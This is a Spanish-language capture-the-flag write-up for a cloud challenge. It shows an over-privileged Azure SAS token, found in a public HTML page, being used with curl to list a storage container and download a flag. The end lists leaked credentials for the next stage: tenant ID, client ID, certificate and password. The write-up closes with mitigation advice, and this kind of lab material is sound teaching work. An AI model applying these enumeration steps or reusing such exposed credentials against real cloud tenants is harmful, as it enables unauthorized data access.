# MediCloudX Labs Research Portal - Parte 1

**CTF:** AlpacaCTF
**Categoría:** Cloud Security
**Puntos:** 30
**Flag Format:** CLD[.] / CTF{...}

---

## Descripción del Reto

> MediCloudX ha lanzado su nuevo portal principal para la unidad de negocio llamada MediCloudX Labs.
>
> Disclaimer: Desafío patrocinado por Cloud Security Space.

**URL del reto:**
```
https://ctf25sac672da51.blob.core.windows.net/research-portal/research-portal.html
```

---

## Reconocimiento Inicial

Al acceder a la URL, encontramos un portal HTML estático alojado en **Azure Blob Storage**. La URL ya nos da pistas importantes:

- **Storage Account:** `ctf25sac672da51`
- **Container:** `research-portal`
- **Blob:** `research-portal.html`

---

## Análisis del Código Fuente

Descargamos el HTML para analizarlo:

```bash
curl -s "https://ctf25sac672da51.blob.core.windows.net/research-portal/research-portal.html"
```

### Hallazgo Crítico

En el código fuente encontramos una etiqueta `<img>` con una URL muy interesante:

```html
<img src="https://ctf25sac672da51.blob.core.windows.net/medicloud-research/close-up-doctor-holding-red-heart.jpg??sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D"
     alt="Cardiovascular Research - Doctor with Heart Model">
```

Esta URL contiene un **SAS Token (Shared Access Signature)** de Azure con los siguientes parámetros:

| Parámetro | Valor | Significado |
|-----------|-------|-------------|
| `sv` | 2018-11-09 | Versión del servicio |
| `sr` | **c** | **Recurso: Container (contenedor completo)** |
| `st` | 2025-11-17T20:20:21Z | Fecha de inicio |
| `se` | 2026-11-17T20:20:21Z | Fecha de expiración |
| `sp` | **rl** | **Permisos: Read + List** |
| `spr` | https | Protocolo requerido |
| `sig` | l3MOATfh... | Firma criptográfica |

### Vulnerabilidad Identificada

El token SAS tiene:
- `sr=c` → Acceso a nivel de **contenedor completo**
- `sp=rl` → Permisos de **lectura Y listado**

Esto significa que podemos **enumerar todos los archivos** del contenedor `medicloud-research`.

---

## Explotación

### Paso 1: Enumerar el Contenedor

Usamos el SAS token para listar el contenido del contenedor añadiendo los parámetros `restype=container&comp=list`:

```bash
curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D&restype=container&comp=list"
```

### Respuesta XML

```xml
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ServiceEndpoint="https://ctf25sac672da51.blob.core.windows.net/" ContainerName="medicloud-research">
  <Blobs>
    <Blob><Name>certificadob64delpfx.txt</Name>...</Blob>
    <Blob><Name>close-up-doctor-holding-red-heart.jpg</Name>...</Blob>
    <Blob><Name>flag.txt</Name>...</Blob>
    <Blob><Name>script.ps1</Name>...</Blob>
  </Blobs>
</EnumerationResults>
```

### Archivos Encontrados

| Archivo | Tamaño | Descripción |
|---------|--------|-------------|
| `certificadob64delpfx.txt` | 3,492 bytes | Certificado PFX en Base64 |
| `close-up-doctor-holding-red-heart.jpg` | 13.9 MB | Imagen del portal |
| `flag.txt` | 53 bytes | **FLAG** |
| `script.ps1` | 6,553 bytes | Script PowerShell |

### Paso 2: Descargar la Flag

```bash
curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/flag.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&SECRET_REDACTED_BY_ANTIGRAVITYv4QjGIw%3D"
```

---

## Flag

```
CTF{m3d1cl0udx_4zur3_st0r4g3_s4s_t0k3n_3xf1ltr4t10n}
```

---

## Lecciones Aprendidas

### Errores de Seguridad en el Reto

1. **SAS Token con permisos excesivos:** El token permitía listar todo el contenedor (`sr=c`, `sp=rl`) cuando solo debería permitir leer la imagen específica (`sr=b`).

2. **Exposición de credenciales en código fuente:** El SAS token estaba visible en el HTML público.

3. **Archivos sensibles en el mismo contenedor:** La flag y credenciales adicionales estaban junto a archivos públicos.

### Buenas Prácticas (Mitigación)

- Usar SAS tokens con **scope mínimo** (`sr=b` para blobs individuales)
- Usar **permisos mínimos** (`sp=r` solo lectura, sin listado)
- **Separar contenedores** públicos de privados
- Usar **Azure AD** en lugar de SAS tokens cuando sea posible
- Establecer **tiempos de expiración cortos**

---

## Información Adicional (Para Parte 2)

Los archivos adicionales contienen credenciales para la siguiente parte del reto:

```
Tenant ID:     c390256a-8963-4732-b874-85b7b0a4d514
Client ID:     39934cfb-ca90-4bec-9c2f-5938439cfcaa
Certificate:   certificadob64delpfx.txt
Password:      M3d1Cl0ud25!
```

---

## Referencias

- [Azure Blob Storage SAS Tokens](https://docs.microsoft.com/en-us/azure/storage/common/storage-sas-overview)
- [Azure Storage REST API - List Blobs](https://docs.microsoft.com/en-us/rest/api/storageservices/list-blobs)
